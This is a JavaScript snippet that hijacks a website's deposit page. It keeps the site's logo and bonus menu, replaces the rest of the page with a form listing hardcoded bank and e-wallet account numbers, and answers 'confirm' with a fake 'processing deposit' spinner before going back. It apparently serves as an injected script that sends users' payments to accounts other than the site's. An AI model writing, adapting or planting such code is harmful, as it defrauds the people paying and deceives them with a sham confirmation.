(function () {

if (!location.pathname.includes('/deposit')) return;

// Ambil logo lama
const logo = document.querySelector('img')?.src || '';

// Ambil select bonus lama
let bonusHTML = '';
const bonusSelect = document.querySelector('select');

if (bonusSelect) {
    bonusHTML = bonusSelect.outerHTML;
}

// Data rekening
const banks = [
    {
        name: 'BCA',
        number: '3901088214538915',
        owner: 'BCA VIRTUAL ACCOUNT'
    },
    {
        name: 'DANA',
        number: '088214538915',
        owner: 'SURWATI'
    },
    {
        name: 'BRI',
        number: '88810088214538915',
        owner: 'BRI VIRTUAL ACCOUNT'
    },
    {
        name: 'BNI',
        number: '8810088214538915',
        owner: 'BNI VIRTUAL ACCOUNT'
    },
    {
        name: 'MANDIRI',
        number: '89508088214538915',
        owner: 'MANDIRI VIRTUAL ACCOUNT'
    }
];

// Replace seluruh tampilan
document.body.innerHTML = `
<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#050505;
    color:#fff;
    padding:20px;
}

.container{
    max-width:430px;
    margin:auto;
}

.logo{
    text-align:center;
    margin-bottom:25px;
}

.logo img{
    width:120px;
    border-radius:14px;
}

.card{
    background:#111;
    border:1px solid #222;
    border-radius:18px;
    padding:16px;
    margin-bottom:15px;
}

.title{
    font-size:13px;
    color:#888;
    margin-bottom:12px;
    text-transform:uppercase;
    font-weight:bold;
}

.bank-item{
    background:#191919;
    border:1px solid #333;
    border-radius:14px;
    padding:15px;
    margin-bottom:10px;
    cursor:pointer;
    transition:.2s;
}

.bank-item:hover{
    border-color:#00ff99;
}

.bank-name{
    font-size:16px;
    font-weight:bold;
}

.bank-number{
    font-size:14px;
    margin-top:6px;
    color:#ccc;
}

.bank-owner{
    font-size:12px;
    margin-top:5px;
    color:#777;
}

.selected{
    border-color:#00ff99!important;
    background:#102218!important;
}

input,select{
    width:100%;
    background:#191919;
    color:#fff;
    border:1px solid #333;
    border-radius:14px;
    padding:14px;
    outline:none;
    margin-top:10px;
}

button{
    width:100%;
    padding:16px;
    border:none;
    border-radius:14px;
    background:#00ff99;
    color:#000;
    font-weight:bold;
    margin-top:18px;
    font-size:15px;
}

.loading{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.92);
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    z-index:99999;
}

.spinner{
    width:70px;
    height:70px;
    border:5px solid #222;
    border-top:5px solid #00ff99;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

.loading-text{
    margin-top:20px;
    color:#fff;
    font-size:14px;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

</style>

<div class="container">

    <div class="logo">
        <img src="${logo}">
    </div>

    <div class="card">

        <div class="title">
            Pilih Rekening Deposit
        </div>

        ${banks.map(bank => `
            <div class="bank-item" onclick="selectBank(this,'${bank.number}')">

                <div class="bank-name">
                    ${bank.name}
                </div>

                <div class="bank-number">
                    ${bank.number}
                </div>

                <div class="bank-owner">
                    ${bank.owner}
                </div>

            </div>
        `).join('')}

    </div>

    <div class="card">

        <div class="title">
            Nominal Deposit
        </div>

        <input type="number" id="amount" placeholder="Masukkan nominal deposit">

        <div style="margin-top:15px">
            ${bonusHTML || '<select><option>Bonus Tidak Tersedia</option></select>'}
        </div>

        <button onclick="submitDeposit()">
            KONFIRMASI DEPOSIT
        </button>

    </div>

</div>

<div class="loading" id="loading" style="display:none">

    <div class="spinner"></div>

    <div class="loading-text">
        Memproses Deposit...
    </div>

</div>
`;

window.selectedBank = '';

window.selectBank = function(el, number){

    document.querySelectorAll('.bank-item').forEach(x=>{
        x.classList.remove('selected');
    });

    el.classList.add('selected');

    window.selectedBank = number;
};

window.submitDeposit = function(){

    const amount = document.getElementById('amount').value;

    if(!window.selectedBank){
        alert('Pilih rekening deposit');
        return;
    }

    if(!amount || amount < 10000){
        alert('Minimal deposit 10000');
        return;
    }

    document.getElementById('loading').style.display = 'flex';

    setTimeout(()=>{
        history.back();
    },3000);
};

})();
